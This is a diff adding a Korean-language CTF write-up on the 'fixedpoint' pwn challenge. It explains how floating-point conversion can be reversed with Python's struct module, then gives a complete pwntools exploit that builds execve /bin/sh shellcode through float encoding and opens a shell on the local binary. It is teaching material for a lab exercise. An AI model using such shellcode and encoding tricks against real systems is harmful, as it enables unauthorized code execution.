@@ -35,4 +35,116 @@ tags: [ctf, pwn, exploit]
   <img src="http://www.c-jump.com/bcc/common/Talk2/Cxx/IEEE_754_fp_standard/const_images/ieee.gif" />
   <br />
   <br />
-  그렇기 때문에 사실상 직접 계산해서 쉘코드를 만드는 것은 많이 복잡한편이다.
+  그렇기 때문에 사실상 직접 계산해서 쉘코드를 만드는 것은 많이 복잡한편이다.<br />
+  그래서 나는 Python의 struct모듈을 활용했는데, 이전까지는 Long, Integer 형태의 데이터만 pack, unpack하기 위해서 사용했었는데 이번에는 처음으로 Floating 옵션을 사용하게 되었다.<br />
+  예를 들어서 위에 있는 1337을 나누는 코드를 내가 원하는 값이 나오게 만들려면 어떤 값을 넣어야할지 찾을 때, 다음과 같은 코드를 사용할 수 있다.<br />
+  ```Python
+  #!/usr/bin/python
+  import struct
+  from pwn import *
+
+  pf32 = lambda x: struct.pack("<f", x)
+  uf32 = lambda x: struct.unpack("<f", x)[0]
+  pl32 = lambda x: struct.pack("<L", x)
+  ul32 = lambda x: struct.unpack("<L", x)[0]
+
+  ...
+  deadbeef = ul32(pl32(uf32("\x41\x41\x41\x41") * 1337))
+  ...
+  ```
+  이 코드의 실행결과는 다음과 같다.
+  <br />16148<br />
+  이를 fixedpoint 바이너리 안에 넣어서 확인해보면 다음과 같은 결과를 볼 수 있다.
+
+  <br />
+  ```
+  (gdb) x/10wx $eip
+  0xf7fcd000:	0x41413e9d	0x00000000	0x00000000	0x00000000
+  0xf7fcd010:	0x00000000	0x00000000	0x00000000	0x00000000
+  0xf7fcd020:	0x00000000	0x00000000
+  (gdb) 
+  ```
+  이는 연산이 잘못된 것이 아니라, 상위 바이트는 우리가 표현할 수 있는 영역에 한계점이 있기 때문에 발생하는 오차이다.<br />
+  이 때문에 우리는 조금 더 안정적인 쉘코드를 작성하려면, 적어도 상위 바이트는 임의로 변하지 않는 값을 넣어주어야 한다.<br />
+  즉, 데이터 타입의 영향을 받지 않는 녀석을 선정해야한다.<br />
+
+
+  ## II. Exploit
+  ```Python
+#!/usr/bin/python
+import struct
+from pwn import *
+
+pf32 = lambda x: struct.pack("<f", x)
+uf32 = lambda x: struct.unpack("<f", x)[0]
+pl32 = lambda x: struct.pack("<L", x)
+ul32 = lambda x: struct.unpack("<L", x)[0]
+
+p = process("./fixedpoint")
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80"
+gadget = asm("inc esi")
+make_sh = []
+
+print "[*] Disassemble Shellcode"
+print "==================================================="
+print disasm(shellcode)
+print "===================================================\n\n"
+
+make_sh.append(asm('mov edi, esp'))		# Stack Pointer Moved
+make_sh.append(asm('mov al, 0x2f'))		# '/'
+make_sh.append(asm('mov [edi], al'))		# mov [edi], al
+make_sh.append(asm('inc edi'))
+
+make_sh.append(asm('mov al, 0x62'))		# 'b'
+make_sh.append(asm('mov [edi], al'))
+make_sh.append(asm('inc edi'))
+
+make_sh.append(asm('mov al, 0x69'))
+make_sh.append(asm('mov [edi], al'))
+make_sh.append(asm('inc edi'))
+
+make_sh.append(asm('mov al, 0x6e'))
+make_sh.append(asm('mov [edi], al'))
+make_sh.append(asm('inc edi'))
+
+make_sh.append(asm('mov al, 0x2f'))
+make_sh.append(asm('mov [edi], al'))
+make_sh.append(asm('inc edi'))
+
+make_sh.append(asm('mov al, 0x73'))
+make_sh.append(asm('mov [edi], al'))
+make_sh.append(asm('inc edi'))
+
+make_sh.append(asm('mov al, 0x68'))
+make_sh.append(asm('mov [edi], al'))
+make_sh.append(asm('inc edi'))
+
+make_sh.append(asm('xor eax, eax'))
+make_sh.append(asm('mov [edi], al'))
+
+make_sh.append(asm('mov ebx, esp'))
+make_sh.append(asm('push eax'))
+make_sh.append(asm('push ebx'))
+make_sh.append(asm('mov ecx, esp'))
+make_sh.append(asm('mov al, 0xb'))
+make_sh.append(asm('xor edx, edx'))
+make_sh.append(asm('int 0x80'))
+
+shell = ''.join(x for x in make_sh)
+print "Final Shellcode"
+print "==========================================="
+print disasm(shell)
+print "==========================================="
+
+for data in make_sh:
+	payload = data
+	payload = payload.ljust(0x3, gadget)
+	payload = payload.rjust(0x4, gadget)
+	floating = ul32(pl32(uf32(payload) * 1337))
+	p.sendline(str(floating))
+
+p.sendline("Get Shell!!")
+print p.recvuntil("go")
+
+p.interactive()
+  ```
